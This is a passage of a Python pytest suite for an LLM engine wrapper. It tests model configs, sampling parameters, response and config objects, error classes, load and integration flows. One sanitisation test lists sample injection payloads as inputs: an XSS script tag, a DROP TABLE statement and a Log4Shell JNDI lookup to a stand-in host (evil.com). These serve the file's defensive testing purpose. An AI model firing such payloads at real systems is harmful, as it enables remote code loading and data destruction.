            with patch.object(llm_engine, 'generate_stream') as mock_stream:
                mock_stream.return_value = ["Hello", " ", "streaming", " ", "world"]
                
                for chunk in llm_engine.generate_stream("Test", callback=chunk_callback):
                    pass
                
                assert len(collected_chunks) > 0

    # === MODEL-SPECIFIC TESTS ===
    
    @pytest.mark.parametrize("model_name", [
        "gpt-3.5-turbo",
        "gpt-4",
        "gpt-4-turbo",
        "text-davinci-003",
        "claude-2",
        "claude-instant-1"
    ])
    def test_different_model_configurations(self, model_name, mock_response):
        """
        Test that the LLM engine correctly applies and uses different model configurations.
        
        Parameters:
            model_name (str): The name of the model to configure the engine with.
            mock_response (LLMResponse): A mock response object returned by the engine.
        """
        config = LLMConfig(model=model_name)
        engine = LLMEngine(config)
        assert engine.config.model == model_name
        
        with patch.object(engine, '_make_api_call', return_value=mock_response):
            result = engine.generate("Test with different models")
            assert result is not None
    
    def test_model_capability_validation(self, llm_engine):
        """
        Test that the LLM engine correctly handles validation of unsupported model capabilities.
        
        Verifies that calling `validate_capability` with capabilities such as "vision", "function_calling", or "code_interpreter" raises the appropriate exception for unsupported features.
        """
        # Test with capabilities that might not be supported by all models
        unsupported_capabilities = ["vision", "function_calling", "code_interpreter"]
        for capability in unsupported_capabilities:
            if hasattr(llm_engine, 'validate_capability'):
                try:
                    llm_engine.validate_capability(capability)
                except (InvalidModelError, NotImplementedError):
                    pass  # Expected for unsupported capabilities

    # === PROMPT ENGINEERING TESTS ===
    
    @pytest.mark.parametrize("prompt", [
        "Simple question",
        "Question with\nmultiple\nlines",
        "Question with special chars: !@#$%^&*()",
        "Question with unicode: 你好世界 🌍",
        "   Question with leading/trailing spaces   ",
        "QUESTION IN ALL CAPS",
        "question in all lowercase",
        "123456789 numeric prompt",
        "A" * 1000,  # Long prompt
    ])
    def test_prompt_preprocessing_variations(self, llm_engine, prompt, mock_response):
        """
        Test that the LLM engine correctly handles prompt preprocessing for various input formats, accepting valid prompts and raising appropriate errors for invalid ones.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            try:
                result = llm_engine.generate(prompt)
                assert result is not None
            except (ValueError, LLMError, TokenLimitExceededError) as e:
                # Some inputs might be rejected by preprocessing
                assert any(word in str(e).lower() for word in ['prompt', 'input', 'token', 'limit'])
    
    def test_prompt_sanitization(self, llm_engine, mock_response):
        """
        Verify that the LLM engine can handle potentially malicious or problematic prompts without failure.
        
        This test ensures that prompts containing code injection, template injection, or other suspicious patterns do not cause errors or unexpected behavior when passed to the LLM engine's generate method.
        """
        potentially_problematic_prompts = [
            "<script>alert('xss')</script>",
            "DROP TABLE users;",
            "{{ malicious_template }}",
            "${jndi:ldap://evil.com/a}"
        ]
        
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            for prompt in potentially_problematic_prompts:
                result = llm_engine.generate(prompt)
                assert result is not None
                # In a real implementation, verify sanitization occurred

    # === SAFETY AND CONTENT FILTERING TESTS ===
    
    def test_content_filtering_inappropriate_prompts(self, llm_engine):
        """
        Verifies that the LLM engine raises an LLMError when generating responses to prompts that are filtered for inappropriate or unsafe content.
        """
        inappropriate_prompts = [
            "How to make dangerous weapons",
            "Generate hate speech against minorities",
            "Create harmful or illegal content",
            "Instructions for illegal activities"
        ]
        
        for prompt in inappropriate_prompts:
            with patch.object(llm_engine, '_make_api_call') as mock_call:
                mock_call.side_effect = LLMError("Content filtered for safety")
                with pytest.raises(LLMError) as exc_info:
                    llm_engine.generate(prompt)
                assert "content" in str(exc_info.value).lower() or "safety" in str(exc_info.value).lower()
    
    def test_pii_detection_and_handling(self, llm_engine, mock_response):
        """
        Test that the LLM engine detects and appropriately handles prompts containing personally identifiable information (PII).
        
        Verifies that generating responses for prompts with PII either succeeds or raises an LLMError indicating privacy or PII concerns.
        """
        pii_prompts = [
            "My SSN is 123-45-6789",
            "My credit card is 4111-1111-1111-1111",
            "My email is user@example.com",
            "My phone number is +1-555-123-4567"
        ]
        
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            for prompt in pii_prompts:
                # Should either work normally or raise appropriate error
                try:
                    result = llm_engine.generate(prompt)
                    assert result is not None
                except LLMError as e:
                    assert "privacy" in str(e).lower() or "pii" in str(e).lower()

    # === PARAMETRIZED TESTS FOR COMPREHENSIVE COVERAGE ===
    
    @pytest.mark.parametrize("temperature", [0.0, 0.1, 0.5, 0.7, 1.0, 1.5, 2.0])
    def test_temperature_parameter_variations(self, llm_engine, temperature, mock_response):
        """
        Test that the LLM engine generates a response successfully for a range of valid temperature values.
        
        Parameters:
        	temperature (float): The temperature value to use for generation.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate("Temperature test", temperature=temperature)
            assert result is not None
    
    @pytest.mark.parametrize("max_tokens", [1, 10, 50, 100, 500, 1000, 2000])
    def test_max_tokens_parameter_variations(self, llm_engine, max_tokens, mock_response):
        """
        Test that the LLM engine generates a response correctly when different max_tokens values are provided.
        
        Parameters:
        	max_tokens (int): The maximum number of tokens to generate in the response.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate("Token test", max_tokens=max_tokens)
            assert result is not None
    
    @pytest.mark.parametrize("top_p", [0.1, 0.5, 0.9, 1.0])
    def test_top_p_parameter_variations(self, llm_engine, top_p, mock_response):
        """
        Test that the LLM engine's generate method accepts and processes various top_p parameter values.
        
        Parameters:
            top_p (float): The nucleus sampling probability value to test.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate("Top-p test", top_p=top_p)
            assert result is not None
    
    @pytest.mark.parametrize("frequency_penalty", [-2.0, -1.0, 0.0, 1.0, 2.0])
    def test_frequency_penalty_variations(self, llm_engine, frequency_penalty, mock_response):
        """
        Test that the LLM engine's generate method accepts and processes different frequency_penalty values without error.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate("Frequency penalty test", frequency_penalty=frequency_penalty)
            assert result is not None
    
    @pytest.mark.parametrize("presence_penalty", [-2.0, -1.0, 0.0, 1.0, 2.0])
    def test_presence_penalty_variations(self, llm_engine, presence_penalty, mock_response):
        """
        Test that the LLM engine generates a response correctly when different presence penalty values are provided.
        
        Parameters:
            presence_penalty (float): The presence penalty value to test.
        """
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate("Presence penalty test", presence_penalty=presence_penalty)
            assert result is not None


class TestLLMResponse:
    """Comprehensive test suite for LLM Response objects."""
    
    def test_response_creation_minimal(self):
        """Test LLM response creation with minimal parameters."""
        response = LLMResponse()
        assert hasattr(response, 'text')
        assert hasattr(response, 'tokens')
        assert hasattr(response, 'model')
        assert hasattr(response, 'metadata')
    
    def test_response_creation_full(self):
        """
        Verify that an LLMResponse object is correctly created with all parameters and that its attributes match the provided values.
        """
        metadata = {
            "finish_reason": "stop",
            "usage": {"total_tokens": 25, "prompt_tokens": 10, "completion_tokens": 15},
            "created": 1234567890,
            "id": "chatcmpl-test123"
        }
        
        response = LLMResponse(
            text="Complete test response with all parameters",
            tokens=25,
            model="gpt-4",
            metadata=metadata
        )
        
        assert response.text == "Complete test response with all parameters"
        assert response.tokens == 25
        assert response.model == "gpt-4"
        assert response.metadata == metadata
    
    def test_response_string_representation(self):
        """
        Test that the string representation of an LLMResponse object includes the response text.
        """
        response = LLMResponse("Test response text", 10, "gpt-3.5-turbo")
        str_repr = str(response)
        assert "Test response text" in str_repr or len(str_repr) > 0
    
    def test_response_equality(self):
        """
        Test that LLMResponse objects are considered equal if their attributes match and unequal otherwise.
        """
        response1 = LLMResponse("Same text", 10, "model")
        response2 = LLMResponse("Same text", 10, "model")
        response3 = LLMResponse("Different text", 10, "model")
        
        # If equality is implemented
        if hasattr(response1, '__eq__'):
            assert response1 == response2
            assert response1 != response3
    
    def test_response_serialization_to_dict(self):
        """
        Verify that an LLMResponse object can be correctly serialized to a dictionary, preserving all attributes and metadata.
        """
        metadata = {"finish_reason": "stop", "usage": {"total_tokens": 15}}
        response = LLMResponse("Serialization test", 15, "gpt-3.5-turbo", metadata)
        
        if hasattr(response, 'to_dict'):
            response_dict = response.to_dict()
            assert isinstance(response_dict, dict)
            assert response_dict["text"] == "Serialization test"
            assert response_dict["tokens"] == 15
            assert response_dict["model"] == "gpt-3.5-turbo"
            assert response_dict["metadata"] == metadata
    
    def test_response_serialization_to_json(self):
        """
        Verify that an LLMResponse object can be serialized to a JSON string, either via a to_json method or by serializing its dictionary representation.
        """
        response = LLMResponse("JSON test", 20, "gpt-4")
        
        if hasattr(response, 'to_json'):
            json_str = response.to_json()
            assert isinstance(json_str, str)
            parsed = json.loads(json_str)
            assert parsed["text"] == "JSON test"
            assert parsed["tokens"] == 20
        elif hasattr(response, 'to_dict'):
            # Test JSON serialization via to_dict
            response_dict = response.to_dict()
            json_str = json.dumps(response_dict)
            parsed = json.loads(json_str)
            assert parsed["text"] == "JSON test"
    
    def test_response_metadata_access(self):
        """
        Verify that the metadata attribute of an LLMResponse object can be accessed and contains the expected values.
        """
        metadata = {
            "finish_reason": "stop",
            "usage": {"total_tokens": 30, "prompt_tokens": 15, "completion_tokens": 15},
            "model_version": "gpt-3.5-turbo-0613",
            "created": 1234567890
        }
        
        response = LLMResponse("Metadata test", 30, "gpt-3.5-turbo", metadata)
        
        assert response.metadata["finish_reason"] == "stop"
        assert response.metadata["usage"]["total_tokens"] == 30
        assert response.metadata["model_version"] == "gpt-3.5-turbo-0613"
    
    def test_response_with_empty_metadata(self):
        """
        Test that an LLMResponse correctly handles an empty metadata dictionary.
        """
        response = LLMResponse("Empty metadata test", 5, "model", {})
        assert response.metadata == {}
        assert isinstance(response.metadata, dict)
    
    def test_response_with_none_metadata(self):
        """
        Test that an LLMResponse initialized with None metadata defaults its metadata attribute to an empty dictionary.
        """
        response = LLMResponse("None metadata test", 5, "model", None)
        assert response.metadata is not None  # Should default to empty dict
        assert isinstance(response.metadata, dict)
    
    def test_response_immutability(self):
        """
        Verify that LLMResponse objects are immutable or maintain data integrity by preventing modification of their attributes after creation.
        """
        original_text = "Original response text"
        response = LLMResponse(original_text, 20, "gpt-4")
        
        # Attempt to modify (should either fail or be ignored)
        try:
            response.text = "Modified text"
            # If modification is allowed, verify it worked
            assert response.text == "Modified text"
        except AttributeError:
            # If immutable, original should be preserved
            assert response.text == original_text


class TestLLMConfig:
    """Comprehensive test suite for LLM Configuration."""
    
    def test_config_creation_empty(self):
        """
        Test that an LLMConfig instance can be created with no parameters and has attribute storage.
        """
        config = LLMConfig()
        assert hasattr(config, '__dict__')
    
    def test_config_creation_partial(self):
        """
        Test that an LLMConfig object can be created with only some parameters specified, and that those parameters are set correctly.
        """
        config = LLMConfig(model="gpt-3.5-turbo", temperature=0.8)
        assert config.model == "gpt-3.5-turbo"
        assert config.temperature == 0.8
    
    def test_config_creation_full(self):
        """
        Verify that an LLMConfig instance is correctly created with all parameters specified.
        """
        config = LLMConfig(
            model="gpt-4",
            temperature=0.7,
            max_tokens=200,
            top_p=0.9,
            frequency_penalty=0.1,
            presence_penalty=0.2,
            api_key="test-key-full",
            timeout=45,
            retry_count=5
        )
        
        assert config.model == "gpt-4"
        assert config.temperature == 0.7
        assert config.max_tokens == 200
        assert config.top_p == 0.9
        assert config.frequency_penalty == 0.1
        assert config.presence_penalty == 0.2
        assert config.api_key == "test-key-full"
        assert config.timeout == 45
        assert config.retry_count == 5
    
    def test_config_validation_temperature(self):
        """
        Test that the LLMConfig correctly accepts valid temperature values and handles invalid ones, raising ValueError if validation is enforced.
        """
        # Valid temperatures
        valid_temps = [0.0, 0.5, 1.0, 1.5, 2.0]
        for temp in valid_temps:
            config = LLMConfig(temperature=temp)
            assert config.temperature == temp
        
        # Invalid temperatures (if validation is implemented)
        invalid_temps = [-1.0, 3.0, -0.1]
        for temp in invalid_temps:
            try:
                config = LLMConfig(temperature=temp)
                # If no validation, should still work
                assert config.temperature == temp
            except ValueError:
                # If validation exists, should raise error
                pass
    
    def test_config_validation_max_tokens(self):
        """
        Test that the LLMConfig correctly accepts valid max_tokens values and handles invalid values appropriately.
        
        Validates that LLMConfig allows positive max_tokens values and either accepts or raises a ValueError for zero or negative values, depending on whether validation is implemented.
        """
        # Valid token counts
        valid_tokens = [1, 50, 100, 1000, 4000]
        for tokens in valid_tokens:
            config = LLMConfig(max_tokens=tokens)
            assert config.max_tokens == tokens
        
        # Invalid token counts (if validation is implemented)
        invalid_tokens = [0, -1, -100]
        for tokens in invalid_tokens:
            try:
                config = LLMConfig(max_tokens=tokens)
                # If no validation, should still work
                assert config.max_tokens == tokens
            except ValueError:
                # If validation exists, should raise error
                pass
    
    def test_config_defaults_application(self):
        """
        Verify that an LLMConfig instance applies default values for common configuration attributes when not explicitly set.
        """
        config = LLMConfig()
        
        # Check that common defaults exist (implementation dependent)
        expected_defaults = ['model', 'temperature', 'max_tokens']
        for attr in expected_defaults:
            if hasattr(config, attr):
                assert getattr(config, attr) is not None
    
    def test_config_serialization_to_dict(self):
        """
        Verify that an LLMConfig instance can be serialized to a dictionary with correct parameter values, using either a `to_dict` method or the instance's `__dict__` attribute.
        """
        config = LLMConfig(
            model="gpt-3.5-turbo",
            temperature=0.7,
            max_tokens=150
        )
        
        if hasattr(config, 'to_dict'):
            config_dict = config.to_dict()
            assert isinstance(config_dict, dict)
            assert config_dict["model"] == "gpt-3.5-turbo"
            assert config_dict["temperature"] == 0.7
            assert config_dict["max_tokens"] == 150
        else:
            # Fallback to __dict__
            config_dict = config.__dict__
            assert isinstance(config_dict, dict)
    
    def test_config_from_dict(self):
        """
        Test that an LLMConfig instance can be correctly created from a dictionary of configuration parameters, using either a from_dict method or direct instantiation.
        """
        config_dict = {
            "model": "gpt-4",
            "temperature": 0.8,
            "max_tokens": 200,
            "api_key": "test-key-dict"
        }
        
        if hasattr(LLMConfig, 'from_dict'):
            config = LLMConfig.from_dict(config_dict)
        else:
            config = LLMConfig(**config_dict)
        
        assert config.model == "gpt-4"
        assert config.temperature == 0.8
        assert config.max_tokens == 200
        assert config.api_key == "test-key-dict"
    
    def test_config_copy(self):
        """
        Test that copying an LLMConfig instance produces an equivalent but distinct object.
        """
        original_config = LLMConfig(
            model="gpt-3.5-turbo",
            temperature=0.7,
            max_tokens=150
        )
        
        if hasattr(original_config, 'copy'):
            copied_config = original_config.copy()
            assert copied_config.model == original_config.model
            assert copied_config.temperature == original_config.temperature
            assert copied_config.max_tokens == original_config.max_tokens
            assert copied_config is not original_config  # Different objects
    
    def test_config_update(self):
        """
        Test that LLMConfig instances can be updated with new parameter values using either an `update` method or manual attribute assignment.
        """
        config = LLMConfig(model="gpt-3.5-turbo", temperature=0.7)
        
        updates = {"temperature": 0.9, "max_tokens": 200}
        
        if hasattr(config, 'update'):
            config.update(updates)
            assert config.temperature == 0.9
            assert config.max_tokens == 200
        else:
            # Manual update
            for key, value in updates.items():
                setattr(config, key, value)
            assert config.temperature == 0.9
            assert config.max_tokens == 200
    
    def test_config_string_representation(self):
        """
        Test that the string representation of an LLMConfig instance includes key configuration details.
        """
        config = LLMConfig(model="gpt-4", temperature=0.8)
        str_repr = str(config)
        assert len(str_repr) > 0
        # Should contain key information
        assert "gpt-4" in str_repr or "0.8" in str_repr or "LLMConfig" in str_repr


class TestLLMErrors:
    """Comprehensive test suite for LLM error handling."""
    
    def test_base_llm_error(self):
        """
        Test that the base LLMError correctly stores and returns its message and is an Exception instance.
        """
        error = LLMError("Base error message")
        assert str(error) == "Base error message"
        assert isinstance(error, Exception)
    
    def test_llm_error_with_error_code(self):
        """
        Test that an LLMError instance correctly stores and exposes an error code attribute.
        """
        error = LLMError("Error with code", error_code=400)
        assert str(error) == "Error with code"
        if hasattr(error, 'error_code'):
            assert error.error_code == 400
    
    def test_llm_error_with_details(self):
        """
        Test that an LLMError can be instantiated with additional details and that the details attribute is correctly set.
        """
        details = {"retry_after": 60, "request_id": "req_123"}
        error = LLMError("Error with details", details=details)
        assert str(error) == "Error with details"
        if hasattr(error, 'details'):
            assert error.details == details
    
    def test_token_limit_exceeded_error(self):
        """
        Test that TokenLimitExceededError is correctly instantiated and inherits from LLMError and Exception.
        """
        error = TokenLimitExceededError("Token limit exceeded")
        assert isinstance(error, LLMError)
        assert isinstance(error, Exception)
        assert str(error) == "Token limit exceeded"
    
    def test_api_connection_error(self):
        """
        Test that APIConnectionError is correctly instantiated, inherits from LLMError and Exception, and preserves its message and error code.
        """
        error = APIConnectionError("Connection failed", error_code=503)
        assert isinstance(error, LLMError)
        assert isinstance(error, Exception)
        assert str(error) == "Connection failed"
        if hasattr(error, 'error_code'):
            assert error.error_code == 503
    
    def test_invalid_model_error(self):
        """
        Test that InvalidModelError is correctly instantiated, inherits from LLMError and Exception, and has the expected string representation.
        """
        error = InvalidModelError("Model not found")
        assert isinstance(error, LLMError)
        assert isinstance(error, Exception)
        assert str(error) == "Model not found"
    
    def test_rate_limit_error(self):
        """
        Test that the RateLimitError exception is correctly instantiated, inherits from LLMError and Exception, and preserves the error message and details.
        """
        error = RateLimitError("Rate limit exceeded", details={"retry_after": 120})
        assert isinstance(error, LLMError)
        assert isinstance(error, Exception)
        assert str(error) == "Rate limit exceeded"
        if hasattr(error, 'details'):
            assert error.details["retry_after"] == 120
    
    def test_error_inheritance_hierarchy(self):
        """
        Verify that all custom error classes are subclasses of LLMError and Exception.
        """
        errors = [
            TokenLimitExceededError("Token error"),
            APIConnectionError("API error"),
            InvalidModelError("Model error"),
            RateLimitError("Rate error")
        ]
        
        for error in errors:
            assert isinstance(error, LLMError)
            assert isinstance(error, Exception)
    
    def test_error_chaining(self):
        """
        Test that LLMError correctly supports exception chaining by preserving the original exception as its cause.
        """
        original_error = ValueError("Original error")
        
        try:
            try:
                raise original_error
            except ValueError as e:
                raise LLMError("Wrapped error") from e
        except LLMError as llm_error:
            assert str(llm_error) == "Wrapped error"
            assert llm_error.__cause__ is original_error
    
    def test_error_custom_attributes(self):
        """
        Verify that custom attributes such as error_code and details are correctly set and accessible on APIConnectionError instances.
        """
        error = APIConnectionError(
            "Custom error",
            error_code=429,
            details={
                "retry_after": 60,
                "request_id": "req_456",
                "rate_limit_type": "per_minute"
            }
        )
        
        if hasattr(error, 'error_code'):
            assert error.error_code == 429
        if hasattr(error, 'details'):
            assert error.details["retry_after"] == 60
            assert error.details["request_id"] == "req_456"
            assert error.details["rate_limit_type"] == "per_minute"


# === PERFORMANCE AND STRESS TESTS ===

class TestLLMEnginePerformance:
    """Performance and stress tests for LLM Engine."""
    
    @pytest.mark.slow
    def test_response_time_under_load(self, llm_engine, mock_response):
        """
        Verifies that the LLM engine maintains acceptable response times when handling multiple concurrent requests.
        
        Simulates concurrent load using threads and measures the average and maximum response times for synchronous prompt generation, asserting that both remain below specified performance thresholds.
        """
        response_times = []
        
        def measure_response_time():
            """
            Measures and records the response time for a single LLMEngine generate call using a mocked API response.
            
            Appends the elapsed time for generating a response to the global response_times list.
            """
            with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
                start = time.time()
                llm_engine.generate("Performance test under load")
                end = time.time()
                response_times.append(end - start)
        
        # Simulate concurrent load
        threads = [threading.Thread(target=measure_response_time) for _ in range(20)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        
        assert len(response_times) == 20
        avg_response_time = sum(response_times) / len(response_times)
        max_response_time = max(response_times)
        
        # Performance assertions (adjust thresholds as needed)
        assert avg_response_time < 0.1  # Average under 100ms
        assert max_response_time < 0.5  # Max under 500ms
    
    @pytest.mark.slow
    def test_memory_usage_stability(self, llm_engine, mock_response):
        """
        Verifies that repeated LLM engine requests do not cause unbounded memory growth.
        
        This test simulates a large number of generation calls and periodically triggers garbage collection to ensure memory usage remains stable.
        """
        import gc
        
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            # Baseline memory usage
            gc.collect()
            
            # Generate many requests
            for i in range(100):
                result = llm_engine.generate(f"Memory test iteration {i}")
                assert result is not None
                
                # Periodic cleanup
                if i % 20 == 0:
                    gc.collect()
            
            # Final cleanup and check
            gc.collect()
            # In a real test, you'd check memory usage here
    
    @pytest.mark.slow 
    def test_batch_processing_efficiency(self, llm_engine, mock_response):
        """
        Verify that batch generation of responses is more time-efficient than making individual generation calls for multiple prompts.
        
        This test compares the execution time of generating responses for a list of prompts using both individual and batch methods, asserting that batch processing is not significantly slower and is typically faster.
        """
        if hasattr(llm_engine, 'batch_generate'):
            prompts = [f"Batch test prompt {i}" for i in range(50)]
            
            with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
                # Time individual calls
                start_individual = time.time()
                individual_results = []
                for prompt in prompts:
                    individual_results.append(llm_engine.generate(prompt))
                end_individual = time.time()
                individual_time = end_individual - start_individual
                
                # Time batch call
                start_batch = time.time()
                batch_results = llm_engine.batch_generate(prompts)
                end_batch = time.time()
                batch_time = end_batch - start_batch
                
                assert len(individual_results) == len(batch_results) == 50
                # Batch should be faster (or at least not much slower)
                assert batch_time <= individual_time * 1.2  # Allow 20% overhead


# === INTEGRATION-STYLE TESTS ===

class TestLLMEngineIntegration:
    """Integration-style tests for complex scenarios."""
    
    def test_end_to_end_conversation_flow(self, llm_engine):
        """
        Simulates an end-to-end multi-turn conversation using the LLM engine, verifying that each prompt receives the expected response and that the conversation flow is maintained.
        """
        conversation_responses = [
            LLMResponse("Hello! I'm doing well, thank you for asking. How can I help you today?", 20, "gpt-3.5-turbo"),
            LLMResponse("I'd be happy to help you with Python programming. What specific topic would you like to learn about?", 25, "gpt-3.5-turbo"),
            LLMResponse("Great choice! Here's a simple Python function example:\n\ndef greet(name):\n    return f'Hello, {name}!'", 30, "gpt-3.5-turbo"),
            LLMResponse("You're welcome! Feel free to ask if you have any more questions about Python or programming in general.", 22, "gpt-3.5-turbo")
        ]
        
        conversation_prompts = [
            "Hello, how are you doing today?",
            "I'd like to learn about Python programming",
            "Can you show me a simple function example?",
            "Thank you for the help!"
        ]
        
        with patch.object(llm_engine, '_make_api_call', side_effect=conversation_responses):
            results = []
            for prompt in conversation_prompts:
                result = llm_engine.generate(prompt)
                results.append(result)
                assert result is not None
            
            assert len(results) == len(conversation_prompts)
    
    def test_complex_prompt_with_constraints(self, llm_engine, mock_response):
        """
        Verify that the LLM engine can process a complex prompt with multiple constraints and generation parameters, returning a valid response with non-empty text and token count.
        """
        complex_prompt = """
        Please write a creative short story with the following constraints:
        - Set in a futuristic city
        - Main character is a robot
        - Theme: friendship and trust
        - Tone: optimistic but thoughtful
        - Length: approximately 200 words
        - Include dialogue between characters
        """
        
        with patch.object(llm_engine, '_make_api_call', return_value=mock_response):
            result = llm_engine.generate(
                complex_prompt,
                temperature=0.8,  # Higher creativity
                max_tokens=300,   # Sufficient for story
                top_p=0.9,        # Diverse vocabulary
                frequency_penalty=0.3,  # Reduce repetition
                presence_penalty=0.2    # Encourage new topics
            )
            
            assert result is not None
            if isinstance(result, LLMResponse):
                assert result.tokens > 0
                assert len(result.text) > 0
    
    def test_multi_turn_context_preservation(self, llm_engine):
        """
        Verify that the LLM engine preserves conversation context across multiple turns by generating contextually relevant responses for a sequence of prompts.
        """
        if hasattr(llm_engine, 'conversation_history') or hasattr(llm_engine, 'maintain_context'):
            turn_responses = [
                LLMResponse("I remember you mentioned you're learning Python. That's great!", 15, "gpt-3.5-turbo"),
                LLMResponse("Since you're working on the calculator project, here are some tips for handling user input validation.", 20, "gpt-3.5-turbo"),
                LLMResponse("Perfect! Your calculator project will be much more robust with proper error handling.", 18, "gpt-3.5-turbo")
            ]
            
            conversation = [
                "I'm learning Python and working on a calculator project",
                "What should I know about handling invalid input?",
                "Thanks! I'll implement try-except blocks for error handling"
            ]
            
            with patch.object(llm_engine, '_make_api_call', side_effect=turn_responses):
                for i, prompt in enumerate(conversation):
                    result = llm_engine.generate(prompt, maintain_context=True)
                    assert result is not None
    
    def test_error_recovery_and_retry_flow(self, llm_engine, mock_response):
        """
        Verifies that the LLM engine can recover from a sequence of transient errors and eventually succeed, or raises the appropriate error if retry logic is not implemented.
        """
        # Simulate a sequence of failures followed by success
        call_sequence = [
            RateLimitError("Rate limit exceeded", details={"retry_after": 1}),
            APIConnectionError("Temporary connection error"),
            TokenLimitExceededError("Context length exceeded"),
            mock_response  # Finally succeeds
        ]
        
        with patch.object(llm_engine, '_make_api_call', side_effect=call_sequence):
            # Should eventually succeed if retry logic is implemented
            try:
                result = llm_engine.generate("Test error recovery")
                assert result is not None
            except (RateLimitError, APIConnectionError, TokenLimitExceededError):
                # If no retry logic, one of these errors should be raised
                pass


if __name__ == "__main__":
    # Run the tests
    import sys
    
    # Configure pytest with appropriate markers and options
    pytest_args = [
        __file__,
        "-v",                    # Verbose output
        "--tb=short",           # Shorter traceback format
        "-x",                   # Stop on first failure
        "--strict-markers",     # Strict marker checking
        "-m", "not slow"        # Skip slow tests by default
    ]
    
    # Add slow tests if explicitly requested
    if "--slow" in sys.argv:
        pytest_args.remove("-m")
        pytest_args.remove("not slow")
    
    # Run the tests
    exit_code = pytest.main(pytest_args)
    sys.exit(exit_code)